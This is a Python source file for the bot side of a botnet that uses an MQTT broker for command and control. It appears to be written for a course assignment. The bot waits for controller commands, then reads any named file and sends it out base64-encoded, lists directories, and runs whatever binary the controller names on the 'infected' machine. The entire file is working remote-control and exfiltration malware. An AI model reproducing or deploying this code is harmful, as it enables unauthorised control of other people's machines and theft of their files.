# 5. Minimal required functionality of the bots:
#   1. announcing the presence of the bot to the controller if asked.
#   2. listing users currently logged in the "infected" device (output of 'w' command).
#   3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
#   4. id of the user running the bot (output of 'id command').
#   5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
#   6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
import base64
import subprocess
import paho.mqtt.client as mqtt
from consts import *


# broker = central server that receives all messages
#          and then routes them to the correct destinations.



def on_message(client, userdata, msg):
    payload = msg.payload.decode()
    if payload.startswith(BOT_ID + ":"):
        full_command = payload.split(":", 1)[1]
        parts = full_command.split(" ", 1)
        action = parts[0] # e.g., "ls"
        argument = parts[1] if len(parts) > 1 else ""
        print(f"Action: {action} | Argument: {argument}")
        try :
            if action == CMD_ANNOUNCE_BOT:
                result = f"Bot {BOT_ID} is online."
            elif action == CMD_COPY_FROM_BOT_TO_CONTROLLER:
                try:
                    with open(argument, "rb") as f:
                        # Encoding to Base64 ensures the binary doesn't break the text channel
                        encoded_str = base64.b64encode(f.read()).decode('utf-8')
                        result = f"FILE_B64:{argument}:{encoded_str}"
                except Exception as e:
                    result = f"Error: {str(e)}"
            elif action == CMD_LIST_FILES:
                # If argument is empty, just use ['ls'], otherwise ['ls', argument]
                cmd_list = ["ls", argument] if argument else ["ls"]
                # capture_output would be modern, but check_output is fine
                # add stderr=subprocess.STDOUT so we see errors in the controller
                result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
            else:
                # execute other commands directly
                # ignore blank "" args
                cmd_list = [action] + ([argument] if argument else [])
                result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()

            if(result == ""):
                return f"{action} command executed"
            client.publish(TOPIC, f"{BOT_ID}_RES: {result}")
        except Exception as e:
            error_message = str(e)
            client.publish(TOPIC, f"{BOT_ID}_ERR: {error_message}")
    else:
        # It's someone else's traffic. Ignore it.
        pass


# both the bot and the controller are 'clients'
# client = mqtt.Client()
# added version to avoid warning
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)


# callback when a message is received
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC)

print("Subscribed! Waiting for commands...")

# prevents the script from ending.
client.loop_forever()

